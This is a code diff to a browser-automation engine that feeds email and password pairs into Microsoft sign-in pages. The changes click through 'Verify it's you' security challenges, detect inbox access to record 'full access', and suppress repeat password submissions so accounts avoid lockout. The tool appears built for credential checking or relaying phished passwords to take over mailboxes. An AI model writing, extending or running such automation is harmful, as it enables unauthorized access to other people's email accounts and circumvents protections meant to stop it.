@@ -1647,7 +1647,32 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         // If no email error was detected, assume email exists and proceed
                         emailExists = true;
                         if (!password) {
-                            logger.info(`[checkAccountAccess][${instanceId}] Email exists, waiting for password.`);
+                            // Microsoft intermittently shows a "Verify it's you" security challenge with a
+                            // "Use your password" tile before the password form renders (late-loading on the
+                            // oauth20_authorize.srf URL). Poll briefly, re-running additional-view handling so
+                            // the "Use your password" link gets clicked, until the password input is actually
+                            // visible — otherwise WAITINGPASSWORD is set on a page with no password field.
+                            const pwInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput)
+                                ? platformConfig.selectors.passwordInput
+                                : [platformConfig.selectors?.passwordInput].filter(Boolean);
+                            const pwRenderDeadline = Date.now() + 10000;
+                            let passwordFormVisible = false;
+                            while (Date.now() < pwRenderDeadline && !passwordFormVisible) {
+                                for (const sel of pwInputSelectors) {
+                                    if (typeof sel !== 'string') continue;
+                                    const selVisible = await page.$eval(sel, el => !!(el.offsetWidth || el.offsetHeight || el.getClientRects().length)).catch(() => false);
+                                    if (selVisible) { passwordFormVisible = true; break; }
+                                }
+                                if (!passwordFormVisible) {
+                                    await handleAdditionalViews(page, platformConfig, instanceId).catch(() => null);
+                                    await new Promise(r => setTimeout(r, 1500));
+                                }
+                            }
+                            if (passwordFormVisible) {
+                                logger.info(`[checkAccountAccess][${instanceId}] Password form rendered after additional-view handling. Email exists, waiting for password.`);
+                            } else {
+                                logger.warn(`[checkAccountAccess][${instanceId}] Password form still not visible after 10s wait (possible "Verify it's you" challenge). Returning WAITING_PASSWORD; resume recovery will handle it.`);
+                            }
                             return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                         }
                         if (await isInbox(page, platformConfig)) {
@@ -3010,14 +3035,41 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         // Only enforce for reused browsers (where page was already on the password screen).
                         // Freshly launched browsers (after stale Chrome was killed) need navigation first.
                         if (isReusingBrowser && page && !(await verifyPageStillValid(page, platformConfig, 'password'))) {
-                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page no longer valid (expected selector missing). Marking FAILED.`);
-                            finalStatus = "FAILED";
-                            updateData.status = "FAILED";
-                            updateData.lastJsonResponse = JSON.stringify({
-                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                                message: "Failed during WAITINGPASSWORD phase: Login page was closed or navigated away."
-                            });
-                            break;
+                            // Page may have drifted to an intermediate Microsoft view (e.g. the
+                            // "Verify it's you" security challenge with a "Use your password" tile)
+                            // instead of the password form. Re-run additional-view handling to click
+                            // "Use your password" before failing the row.
+                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page no longer on password screen (expected selector missing). Attempting view recovery...`);
+                            await handleAdditionalViews(page, platformConfig, `pid-${page.browser().process()?.pid || 'unknown'}`, 'general').catch(() => null);
+                            await new Promise(r => setTimeout(r, 2000));
+                            const pageValidAfterRecovery = await verifyPageStillValid(page, platformConfig, 'password').catch(() => false);
+                            if (!pageValidAfterRecovery) {
+                                // Still no password input — the session may actually be signed in already
+                                // (post-consent / post-verification landing in the inbox). Treat inbox as success.
+                                const reachedInboxAfterRecovery = await isInbox(page, platformConfig).catch(() => false);
+                                if (reachedInboxAfterRecovery) {
+                                    logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached after page recovery. Treating as full access.`);
+                                    finalStatus = "COMPLETED";
+                                    updateData.status = "COMPLETED";
+                                    updateData.verified = true;
+                                    updateData.fullAccess = true;
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED",
+                                        verified: true, fullAccess: true,
+                                        message: "Already signed in (inbox reached after page recovery)."
+                                    });
+                                    break;
+                                }
+                                logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page still invalid after recovery. Marking FAILED.`);
+                                finalStatus = "FAILED";
+                                updateData.status = "FAILED";
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                                    message: "Failed during WAITINGPASSWORD phase: Login page was closed or navigated away."
+                                });
+                                break;
+                            }
+                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password screen recovered after additional-view handling.`);
                         }
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
@@ -3252,6 +3304,7 @@ if (!foundSelector) {
                                 if (submitMethod === 'ENTER_KEY') {
                                     const enterCheckStart = Date.now();
                                     let enterChangedPage = false;
+                                    let submitErrorDetected = false;
                                     while (Date.now() - enterCheckStart < 10000) {
                                         const urlNow = page.url();
                                         const pwVisibleNow = await page.evaluate((sels) => {
@@ -3259,12 +3312,33 @@ if (!foundSelector) {
                                             return false;
                                         }, passwordInputSelectors).catch(() => false);
                                         if (urlNow !== urlBeforePwSubmit || !pwVisibleNow) { enterChangedPage = true; break; }
+                                        // Detect wrong-password / passwordless / lockout markers the moment they
+                                        // render. Microsoft resolves the submit asynchronously and can re-render
+                                        // the error IN PLACE on the paginated /common/login page (M365/office
+                                        // accounts) with NO URL change — the old loop watched URL+input only and
+                                        // falsely concluded "Enter did not navigate", then the button fallback
+                                        // re-submitted the same rejected password (escalating to account lockout)
+                                        // and let the engine act like the password was accepted.
+                                        if (await failIfAccountLockout(platformConfig)) {
+                                            logger.warn(`[processRow][${browserId}] Account lockout detected during Enter submit verification. Failing immediately.`);
+                                            return;
+                                        }
+                                        if (await detectPasswordUnavailable(page, platformConfig).catch(() => false)) {
+                                            submitErrorDetected = true;
+                                            break;
+                                        }
+                                        if (await detectPasswordError(page, platformConfig).catch(() => false)) {
+                                            submitErrorDetected = true;
+                                            break;
+                                        }
                                         await new Promise(res => setTimeout(res, 1000));
                                     }
                                     logger.info(`[processRow][${browserId}][SPEED] Enter submit verification: changed=${enterChangedPage}, waited=${Date.now() - enterCheckStart}ms`);
 
-                                    // 3) BUTTON FALLBACK — only if Enter did not navigate the page.
-                                    if (!enterChangedPage) {
+                                    // 3) BUTTON FALLBACK — only if Enter did not navigate the page AND no
+                                    // wrong-password/passwordless error is already showing (re-submitting via
+                                    // the button would only re-send the rejected password and escalate to lockout).
+                                    if (!enterChangedPage && !submitErrorDetected) {
                                         logger.info(`[processRow][${browserId}] Enter did not navigate the page. Falling back to password next button click.`);
                                         const selectorsToAttempt = Array.isArray(passwordNextButtonSelector) ? passwordNextButtonSelector : [passwordNextButtonSelector];
                                         for (const selector of selectorsToAttempt) {
